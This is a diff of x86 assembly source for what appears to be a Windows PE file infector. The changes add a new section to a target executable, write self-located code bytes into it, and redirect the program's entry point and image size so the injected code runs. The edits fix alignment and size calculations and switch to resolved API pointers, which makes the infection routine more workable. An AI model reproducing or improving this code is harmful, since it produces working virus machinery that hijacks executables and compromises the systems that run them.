@@ -51,6 +51,8 @@ PeStartHeader		dd	?
 SectionAlignment	dd	?
 FileAlignment		dd	?
 NewSectionCodeSize	dd	?
+VirtualAddress		dd	?
+SizeOfRawData		dd	?
 
 ; Debug
 ErrorMessage	db	"Error",0
@@ -261,12 +263,12 @@ mov	esi, edx
 add	esi, 0F8h
 mov	[DELTA PeStartHeader], esi
 mov	ebx, esi ; Keep start of Headers
-mov	LastSec, 0
+mov	[DELTA LastSec], 0
 Loop_SectionHeader:
 ; GET LAST SECTION
 mov	eax, esi
 add	eax, 0Ch
-cmp	LastSec, eax
+cmp	[DELTA LastSec], eax
 jg	keepLastSec
 mov	[DELTA LastSecHeader], esi
 mov	[DELTA LastSec], eax
@@ -317,11 +319,11 @@ loop CopySectionName
 ; Virtual Size
 popa	; Retrieve registers
 add	edi, 08h
-mov	[DELTA NewSectionCodeSize], toInject - endInject ; Size of actual code in new section
-mov	ecx, NewSectionCodeSize
+mov	[DELTA NewSectionCodeSize], endInject - toInject ; Size of actual code in new section
+mov	ecx, [DELTA NewSectionCodeSize]
 mov	[edi], ecx
 
-; Virtual Address (Last section VA + Alignment TODO Check if our code not superior ?)
+; Virtual Address
 add	edi, 04h
 mov	ecx, [DELTA LastSecHeader]
 add	ecx, 08h ; LastSecHeader.VirtualSize
@@ -336,9 +338,10 @@ div	[DELTA SectionAlignment] ; divide eax by SectionAlignement
 add	eax, 1
 mul	[DELTA SectionAlignment]
 mov	[edi], eax
+mov	[DELTA VirtualAddress], eax
 mov	esi, eax ; Keep New VA for EntryPoint
 
-; Size of raw data (FileAlignment TODO Check if our code not superior?)
+; Size of raw data
 add	edi, 04h
 mov	eax, [DELTA NewSectionCodeSize]
 sub	eax, 1
@@ -347,7 +350,7 @@ div	[DELTA FileAlignment] ; divide eax by FileAlignment
 add	eax, 1
 mul	[DELTA FileAlignment]
 mov	[edi], eax
-
+mov	[DELTA SizeOfRawData], eax
 
 ; Pointer to raw data (Get last section pointer to raw data + size of raw data)
 add	edi, 04h
@@ -369,15 +372,24 @@ mov	[edi], ecx
 
 ; CHANGE PE PROPERTIES
 ; TODO CHANGE SIZE OF CODE
+; TODO CHANGE SIZE OF HEADERS
+; SizeOfCode : Old + SizeOfRawData aligned on SectionAlignment
 mov	eax, [DELTA PeNtHeader]
 add	eax, 01Ch
 ; CHANGE ENTRY POINT TODO Need to size every section ?
 add	eax, 0Ch
 mov	[eax], esi
 ; CHANGE SIZE OF IMAGE TODO Size every function ?
+xor	edi, edi
+getSizeRawDataAligned:
+cmp	[DELTA SizeOfRawData], edi
+jl	SizeOfCodeSectionDone
+add	edi, [DELTA SectionAlignment]
+loop	getSizeRawDataAligned
+SizeOfCodeSectionDone:
 add	eax, 028h
 add	ebx, 08h
-add	esi, 01h ; TODO - WTF IS THIS SHIT ? (Size of all virtual size + 1?)
+add	esi, edi
 mov	[eax], esi
 ; CLOSE
 PDELTA	PeFileMap
@@ -397,13 +409,14 @@ push	0
 push	FILE_SHARE_READ
 push	FILE_APPEND_DATA
 PDELTA	offset FileName
-call	CreateFile
+call	[DELTA pCreateFile]
 mov	[DELTA PeFile], eax
 call	CheckError
 
 ; INSERT OPCODE
-mov	ecx, 512 ; Number of bytes
-mov	esi, [DELTA toInject] ; Source bytes
+mov	ecx, [DELTA NewSectionCodeSize] ; Number of bytes
+mov	esi, toInject
+add	esi, ebp ; Source bytes
 push	0
 push	0
 push	ecx
